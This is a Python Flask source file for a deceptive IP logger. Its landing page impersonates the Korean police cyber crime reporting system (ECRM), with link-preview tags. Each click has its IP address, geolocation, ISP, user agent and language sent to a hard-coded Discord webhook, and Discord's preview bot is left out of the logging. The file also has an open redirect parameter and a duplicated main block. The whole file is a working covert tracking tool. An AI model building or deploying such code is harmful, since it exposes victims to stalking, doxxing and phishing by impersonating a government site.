import os
import requests
from flask import Flask, request, redirect, Response, send_from_directory

app = Flask(__name__)

WEBHOOK = "https://discord.com/api/webhooks/1571455646560288778/NxJFzUWwmTXQMqoaIYe1E17RnO4emiPuIBmyzScnLOflK2Z6DsTj41tEzB0Jd3vmH4M3"


def get_ip(req):
    fwd = req.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    return req.remote_addr or "unknown"


def lookup(ip):
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={"fields": "status,country,regionName,city,isp,org,as,query"},
            timeout=5,
        )
        return r.json()
    except Exception:
        return {"status": "fail"}


def send_webhook(ip, ua, referer, lang, geo, target=None):
    if not WEBHOOK:
        return

    embed = {
        "title": "New Hit",
        "color": 0x2ECC71,
        "fields": [
            {"name": "IP", "value": f"`{ip}`", "inline": True},
            {"name": "Country", "value": geo.get("country", "?"), "inline": True},
            {"name": "City", "value": geo.get("city", "?"), "inline": True},
            {"name": "ISP", "value": geo.get("isp", "?"), "inline": True},
            {"name": "Org", "value": geo.get("org", "?"), "inline": True},
            {"name": "ASN", "value": geo.get("as", "?"), "inline": True},
            {"name": "Referer", "value": f"`{referer[:100]}`", "inline": False},
            {"name": "User-Agent", "value": f"```{ua[:200]}```", "inline": False},
            {"name": "Language", "value": lang[:60], "inline": False},
        ],
        "footer": {"text": "ip-logger"},
    }

    payload = {"embeds": [embed]}
    if target and target.startswith(("http://", "https://")):
        payload["content"] = f"[→ redirect]({target})"

    try:
        requests.post(WEBHOOK, json=payload, timeout=5)
    except Exception as e:
        print("webhook failed:", e)


LANDING_HTML = """
<!doctype html>
<html lang="ko">
<head>
    <meta charset="utf-8">
    <title>사이버범죄 신고시스템 (ECRM)</title>
    
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://ecrm-police.onrender.com/t">
    <meta property="og:title" content="사이버범죄 신고시스템 (ECRM)">
    <meta property="og:description" content="여기를 눌러 링크를 확인하세요.">
    <meta property="og:image" content="https://ecrm-police.onrender.com/preview.png">
    
    <meta name="twitter:card" content="summary_large_image">
    
    <style>
        body {
            background-color: #f3f4f6;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        h2 { color: #111827; margin-bottom: 10px; }
        a { color: #2563eb; text-decoration: none; font-size: 18px; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h2>사이버범죄 신고시스템 (ECRM)</h2>
        <a href="https://ecrm.police.go.kr">여기를 눌러 링크를 확인하세요.</a>
    </div>
</body>
</html>
"""


@app.route("/preview.png")
def serve_preview():
    return send_from_directory(os.path.dirname(__file__), "preview.png")


@app.route("/t")
def track():
    ip = get_ip(request)
    ua = request.headers.get("User-Agent", "unknown")
    referer = request.headers.get("Referer", "direct")
    lang = request.headers.get("Accept-Language", "unknown")
    target = request.args.get("redirect", "")

    if "Discordbot" not in ua:
        geo = lookup(ip)
        send_webhook(ip, ua, referer, lang, geo, target or None)

    if target and target.startswith(("http://", "https://")):
        return redirect(target, code=302)

    return Response(LANDING_HTML, mimetype="text/html")


@app.route("/")
def home():
    return Response("ok", mimetype="text/plain")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
